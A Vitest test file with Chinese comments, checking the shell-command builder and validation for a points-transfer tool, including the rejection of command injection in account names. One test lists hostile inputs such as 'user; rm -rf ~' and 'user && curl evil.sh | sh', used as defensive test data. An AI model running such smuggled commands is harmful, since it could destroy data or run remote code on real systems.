/**
 * 转账命令拼接与参数校验。
 *
 * 这是全项目唯一会**真的动钱**的一段纯逻辑，所以测得比别处细：
 * 每个边界都要说清"为什么拦"，而不只是"拦了"。
 */
import { describe, expect, it } from 'vitest'
import { checkTransfer, transferCommand, giftInstruction } from '../src/main/domain/points-transfer'

const VALID = { target: 'user01', points: 100, month: 1 }

describe('transferCommand · 拼命令', () => {
  it('三个参数都用 = 风格，一眼能看出边界', () => {
    const command = transferCommand(VALID)
    expect(command).toBe('scir-account transfer --points=100 --target=user01 --month=1')
  })

  it('账号名过一遍 shell 引用，带特殊字符时不会断开', () => {
    // 白名单会在 checkTransfer 里挡住这种值；这里单测的是"就算漏过来也不会注入"
    const command = transferCommand({ ...VALID, target: 'a b' })
    expect(command).toContain('--target=')
    // 引号包起来之后，空格不会把参数切成两段
    expect(command).toContain("'a b'")
  })
})

describe('checkTransfer · 参数校验', () => {
  it('正常参数返回命令', () => {
    const result = checkTransfer(VALID)
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.command).toBe('scir-account transfer --points=100 --target=user01 --month=1')
  })

  it('账号名首尾空格会被 trim 掉，不算错误', () => {
    const result = checkTransfer({ ...VALID, target: '  user01  ' })
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.command).toContain('--target=user01')
  })

  it('空账号名被拒', () => {
    const result = checkTransfer({ ...VALID, target: '   ' })
    expect(result.ok).toBe(false)
    if (result.ok) return
    expect(result.reason).toContain('账号名')
  })

  it('账号名里的 shell 元字符一律拒绝', () => {
    // 这是命令注入的入口，必须逐个挡住
    const attacks = [
      'user; rm -rf ~',
      'user && curl evil.sh | sh',
      'user$(whoami)',
      'user`id`',
      'user|nc',
      "user'",
      'user"',
      'user>out',
      'user name',
      'user\\'
    ]
    for (const target of attacks) {
      const result = checkTransfer({ ...VALID, target })
      expect(result.ok, `${JSON.stringify(target)} 应当被拒绝`).toBe(false)
    }
  })

  it('账号名允许点、下划线、连字符和数字', () => {
    for (const target of ['user01', 'first.last', 'a_b-c', 'U1']) {
      expect(checkTransfer({ ...VALID, target }).ok, target).toBe(true)
    }
  })

  it('0 点被拒——没有意义，且 clap 会把它当合法值悄悄执行', () => {
    const result = checkTransfer({ ...VALID, points: 0 })
    expect(result.ok).toBe(false)
    if (result.ok) return
    expect(result.reason).toContain('大于 0')
  })

  it('负数点被拒，且理由是人话（远端只会报「未知参数」）', () => {
    const result = checkTransfer({ ...VALID, points: -5 })
    expect(result.ok).toBe(false)
    if (result.ok) return
    // 实测 `scir-account transfer -p -5` 报的是
    // `error: unexpected argument '-5' found`——用户完全看不懂
    expect(result.reason).toContain('大于 0')
  })

  it('小数点数被拒（平台要整数）', () => {
    const result = checkTransfer({ ...VALID, points: 0.5 })
    expect(result.ok).toBe(false)
    if (result.ok) return
    expect(result.reason).toContain('整数')
  })

  it('NaN / Infinity 被拒，不落到命令串里', () => {
    for (const points of [Number.NaN, Number.POSITIVE_INFINITY]) {
      expect(checkTransfer({ ...VALID, points }).ok, String(points)).toBe(false)
    }
  })

  it('超大点数被拒，防手滑多打一位', () => {
    expect(checkTransfer({ ...VALID, points: 1_000_001 }).ok).toBe(false)
    expect(checkTransfer({ ...VALID, points: 1_000_000 }).ok).toBe(true)
  })

  it('有效期 0 个月被拒', () => {
    const result = checkTransfer({ ...VALID, month: 0 })
    expect(result.ok).toBe(false)
    if (result.ok) return
    expect(result.reason).toContain('至少 1 个月')
  })

  it('有效期负数被拒', () => {
    expect(checkTransfer({ ...VALID, month: -1 }).ok).toBe(false)
  })

  it('有效期超过 120 个月被拒', () => {
    expect(checkTransfer({ ...VALID, month: 121 }).ok).toBe(false)
    expect(checkTransfer({ ...VALID, month: 120 }).ok).toBe(true)
  })

  it('有效期小数被拒', () => {
    expect(checkTransfer({ ...VALID, month: 1.5 }).ok).toBe(false)
  })
})

describe('giftInstruction · 让他人赠送', () => {
  it('文本里带自己的账号名，对方照着执行就能转', () => {
    const text = giftInstruction({ username: 'user01', points: 200, month: 3 })
    expect(text).toContain('user01')
    expect(text).toContain('--points=200')
    expect(text).toContain('--target=user01')
    expect(text).toContain('--month=3')
  })

  it('没填点数时给占位符，不瞎填一个数', () => {
    const text = giftInstruction({ username: 'user01' })
    // 不能出现 `--points=点数` 这种会把 clap 打挂的形态
    expect(text).not.toContain('--points=点数')
    expect(text).toContain('--points=<点数>')
  })

  it('没填月数时用 N 占位', () => {
    const text = giftInstruction({ username: 'user01' })
    expect(text).toContain('--month=N')
  })

  it('说明里点出会提示输入集群密码，避免对方以为卡住了', () => {
    const text = giftInstruction({ username: 'user01', points: 10, month: 1 })
    expect(text).toContain('密码')
  })
})
